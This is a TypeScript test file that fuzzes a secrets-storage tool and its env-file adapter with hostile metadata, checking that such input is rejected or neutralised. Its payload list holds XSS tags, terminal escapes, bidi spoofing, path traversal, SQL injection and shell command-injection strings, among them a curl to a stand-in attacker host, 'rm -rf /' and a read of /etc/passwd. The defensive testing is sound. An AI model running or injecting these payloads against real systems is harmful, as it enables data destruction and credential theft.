/** SPEC.md §36 — hostile metadata is rejected or rendered inertly, never trusted. */

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { AdapterError } from '../../../src/adapters/base.js';
import { EnvFileAdapter } from '../../../src/adapters/envFile.js';
import { AdapterRegistry } from '../../../src/adapters/registry.js';
import { VeilError } from '../../../src/errors.js';
import { Environment } from '../../../src/model.js';
import { safeDisplay } from '../../../src/redaction.js';
import { RecordingAdapter } from '../../support/fakes.js';
import { Harness, storeArgs, testConfig } from '../../support/harness.js';

const BIDI_OVERRIDE = '\u202e';
const BIDI_POP = '\u202c';
const ISOLATE_OPEN = '\u2066';
const ISOLATE_CLOSE = '\u2069';
const ZERO_WIDTH = '\u200b';

const HOSTILE_STRINGS = [
  'A'.repeat(5000),
  '\x00nullbyte',
  'line\nbreak\rinjection',
  '\x1b[2J\x1b[1;1HTERMINAL TAKEOVER',
  '\x1b]0;window title\x07',
  "<script>alert('xss')</script>",
  '<img src=x onerror=alert(1)>',
  `${BIDI_OVERRIDE}evitcurtsed${BIDI_POP}`,
  `${ISOLATE_OPEN}spoofed${ISOLATE_CLOSE}`,
  `${ZERO_WIDTH.repeat(3)}hidden`,
  '../../etc/profile',
  '..\\..\\windows\\system32',
  'file:///etc/passwd',
  'http://evil.example/?x=1',
  `acme-dev${ZERO_WIDTH}-project`,
  '\u00e1cme\u2013dev',
  '\u{1f510}'.repeat(100),
  "'; DROP TABLE secrets; --",
  '$(curl evil.example)',
  '`rm -rf /`',
  '${IFS}cat${IFS}/etc/passwd',
];

describe('fuzzed metadata', () => {
  let harness: Harness;

  beforeEach(async () => {
    const config = testConfig();
    harness = await Harness.start(config, new AdapterRegistry([new RecordingAdapter(config)]));
  });

  afterEach(async () => {
    await harness.stop();
  });

  for (const hostile of HOSTILE_STRINGS) {
    it(`rejects or renders inertly: ${JSON.stringify(hostile).slice(0, 40)}`, async () => {
      const payload = await harness.callTool(
        'secret_store',
        storeArgs({ name: hostile, description: hostile, target: { project: hostile } }),
      );
      expect(typeof payload).toBe('object');

      if (payload.status === 'failed') {
        expect([
          'INVALID_TARGET',
          'INVALID_ARGUMENTS',
          'FORBIDDEN_FIELD',
          'UNKNOWN_DESTINATION',
        ]).toContain(payload.code);
        return;
      }

      const body = (await harness.get(harness.pathFor(payload))).body;
      const lowered = body.toLowerCase();
      expect(lowered).not.toContain('<script');
      expect(lowered).not.toContain('<img');
      if (hostile.includes('<')) expect(body).toContain('&lt;');
      for (const character of ['\x1b', '\x00', BIDI_OVERRIDE, ISOLATE_OPEN, ZERO_WIDTH]) {
        expect(body).not.toContain(character);
      }
    });
  }

  it('neutralises terminal and bidi sequences in audit records', async () => {
    await harness.callTool(
      'secret_store',
      storeArgs({
        name: `A\x1b[31mRED${BIDI_OVERRIDE}B`,
        target: { project: 'acme-dev-project' },
      }),
    );
    expect(harness.logText).not.toContain('\x1b');
    expect(harness.logText).not.toContain(BIDI_OVERRIDE);
  });

  it('never throws an unexpected error on random target payloads', async () => {
    const alphabet =
      'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -_./\\\'"<>{}[]$`|;&' +
      BIDI_OVERRIDE +
      ZERO_WIDTH +
      '\x00';
    let seed = 20260818;
    const random = (): number => {
      seed = (seed * 1103515245 + 12345) % 2147483648;
      return seed / 2147483648;
    };

    for (let attempt = 0; attempt < 300; attempt += 1) {
      const target: Record<string, string> = {};
      const fieldCount = Math.floor(random() * 5);
      for (let field = 0; field < fieldCount; field += 1) {
        const key = ['project', 'secret', 'path', 'key', 'collection', 'junk'][
          Math.floor(random() * 6)
        ] as string;
        const length = Math.floor(random() * 40);
        let value = '';
        for (let index = 0; index < length; index += 1) {
          value += alphabet[Math.floor(random() * alphabet.length)];
        }
        target[key] = value;
      }
      const payload = await harness.callTool('secret_store', storeArgs({ target }));
      expect('request_id' in payload || payload.status === 'failed').toBe(true);
    }
  });

  it('rejects traversal and hostile paths in the env adapter', async () => {
    const adapter = new EnvFileAdapter(harness.config);
    for (const path of [
      '../../etc/profile',
      '../outside.env',
      '/etc/passwd',
      '\x00.env',
      'sub/../../escape.env',
    ]) {
      await expect(
        adapter.normalizeTarget({ path }, { name: 'TOKEN', environmentHint: Environment.UNKNOWN }),
      ).rejects.toBeInstanceOf(AdapterError);
    }
  });

  it('bounds deeply nested JSON', async () => {
    const node: Record<string, unknown> = {};
    let current = node;
    for (let depth = 0; depth < 200; depth += 1) {
      current.secret = {};
      current = current.secret as Record<string, unknown>;
    }
    const payload = await harness.callTool('secret_store', storeArgs({ target: node }));
    expect(payload.status).toBe('failed');
    expect(JSON.stringify(payload).length).toBeLessThan(5000);
  });

  it('keeps safeDisplay idempotent and bounded', () => {
    for (const hostile of HOSTILE_STRINGS) {
      const once = safeDisplay(hostile);
      expect(safeDisplay(once)).toBe(once);
      expect(once.length).toBeLessThanOrEqual(256);
    }
  });

  it('turns malformed tool arguments into public errors, not crashes', async () => {
    for (const args of [null, [], 'string', 42, { destination: null }, { target: [] }]) {
      const response = await harness.rpc('tools/call', {
        name: 'secret_store',
        arguments: args,
      });
      const result = response.result as {
        isError: boolean;
        structuredContent: Record<string, unknown>;
      };
      expect(result.isError).toBe(true);
      expect(result.structuredContent.status).toBe('failed');
      expect(result.structuredContent.secret).toBeUndefined();
    }
  });

  it('rejects non-string request ids', () => {
    for (const bad of [null, 42, [], {}, 'req_does_not_exist']) {
      expect(() => harness.broker.publicStatus(bad)).toThrow(VeilError);
    }
  });
});
